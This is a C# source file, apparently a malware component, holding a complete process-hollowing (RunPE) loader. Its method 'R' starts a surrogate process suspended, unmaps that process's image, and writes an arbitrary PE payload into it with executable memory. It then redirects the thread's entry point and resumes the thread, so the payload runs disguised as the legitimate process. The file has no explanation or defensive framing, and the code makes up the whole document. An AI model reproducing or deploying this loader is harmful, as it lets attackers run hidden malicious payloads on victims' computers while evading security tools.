using System.Runtime.InteropServices;
using System;
using System.Text;
public class IX
{
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);
    [DllImport("kernel32")]
    private static extern bool SetThreadContext(IntPtr t, uint[] c);
    [DllImport("ntdll")]
    private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32")]
    private static extern bool ReadProcessMemory(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);
    [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    public static bool R(byte[] bytes, string surrogateProcess)
    {
        try
        {
            IntPtr procAttr = IntPtr.Zero;
            IntPtr[] processInfo = new IntPtr[4];
            byte[] startupInfo = new byte[0x44];
            int num2 = BitConverter.ToInt32(bytes, 60);
            int num = BitConverter.ToInt16(bytes, num2 + 6);
            IntPtr ptr4 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));
            if (CreateProcess(null, new StringBuilder(surrogateProcess), procAttr, procAttr, false, 4, procAttr, null, startupInfo, processInfo))
            {
                uint[] ctxt = new uint[0xb3];
                ctxt[0] = 0x10002;
                if (GetThreadContext(processInfo[1], ctxt))
                {
                    IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
                    IntPtr buffer = IntPtr.Zero;
                    IntPtr bufferSize = new IntPtr(4);
                    IntPtr numRead = IntPtr.Zero;
                    if (ReadProcessMemory(processInfo[0], baseAddr, ref buffer, (int)bufferSize, ref numRead) &&
                    (NtUnmapViewOfSection(processInfo[0], buffer) == 0))
                    {
                        IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
                        IntPtr size = new IntPtr(BitConverter.ToInt32(bytes, num2 + 80));
                        IntPtr lpBaseAddress = VirtualAllocEx(processInfo[0], addr, size, 0x3000, 0x40);
                        int lpNumberOfBytesWritten;
                        WriteProcessMemory(processInfo[0], lpBaseAddress, bytes, (uint)((int)ptr4), out lpNumberOfBytesWritten);
                        int num5 = num - 1;
                        for (int i = 0; i <= num5; i++)
                        {
                            int[] dst = new int[10];
                            Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), dst, 0, 40);
                            byte[] buffer2 = new byte[(dst[4] - 1) + 1];
                            Buffer.BlockCopy(bytes, dst[5], buffer2, 0, buffer2.Length);
                            size = new IntPtr(lpBaseAddress.ToInt32() + dst[3]);
                            addr = new IntPtr(buffer2.Length);
                            WriteProcessMemory(processInfo[0], size, buffer2, (uint)addr, out lpNumberOfBytesWritten);
                        }
                        size = new IntPtr(ctxt[0x29] + 8L);
                        addr = new IntPtr(4);
                        WriteProcessMemory(processInfo[0], size, BitConverter.GetBytes(lpBaseAddress.ToInt32()), (uint)addr, out lpNumberOfBytesWritten);
                        ctxt[0x2c] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
                        SetThreadContext(processInfo[1], ctxt);
                    }
                }
                ResumeThread(processInfo[1]);
            }
        }
        catch
        {
            return false;
        }
        return true;
    }
}